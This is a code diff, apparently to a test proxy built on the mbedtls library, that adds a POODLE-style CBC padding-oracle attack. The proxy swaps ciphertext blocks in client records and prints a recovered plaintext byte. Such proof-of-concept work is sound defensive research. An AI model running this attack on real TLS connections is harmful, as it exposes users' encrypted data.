@@ -93,6 +93,7 @@ int forward( mbedtls_net_context *from,
              enum direction dir )
 {
     unsigned char buf[MAX_MSG_SIZE];
+    unsigned char *rec;
     int ret;
     size_t len;
 
@@ -105,19 +106,37 @@ int forward( mbedtls_net_context *from,
     len = (size_t) ret;
     printf( "forwarding %d bytes (%s)\n", ret, dir == c2s ? "c2s" : "s2c" );
 
+    if( dir == c2s && len == 170 )
+        rec = buf + 37;
+    else
+        rec = buf;
+
     /*
      * Only alter record from client to server that are AppData,
      * skipping 1-byte records from 1/n-1 splitting.
+     *
+     * We know the interesting records are exactly 128 + 5 bytes,
+     * so check for that.
      */
     if( dir == c2s &&
-        len > 40 &&
-        buf[0] == MBEDTLS_SSL_MSG_APPLICATION_DATA )
+        ( len == 133 || len == 170 ) &&
+        rec[0] == MBEDTLS_SSL_MSG_APPLICATION_DATA )
     {
+        unsigned char value;
+
         /*
-         * For now just do a dummy change, it should be enough to start
-         * detecting that we get failures with probability 255/256
+         * The byte under attack is byte 63 of the plaintext
+         * so the interesting block starts at byte 48 + 5 in the record.
          */
-        buf[len-1] = 0;
+        memcpy( buf + 112 + 5, buf + 48 + 5, 16 );
+
+        /*
+         * If that message is accepted, it means the byte under attack is 0x0f
+         * xor the last bytes of the previous and last-but-one blocks
+         */
+        value = buf[5 + 112 - 1] ^ 0x0f ^ buf[5 + 48 - 1];
+        fprintf( stderr, "0x%0x\n", value );
+        fflush( stderr );
     }
 
     if( ( ret = mbedtls_net_send( to, buf, len ) ) < 0 )
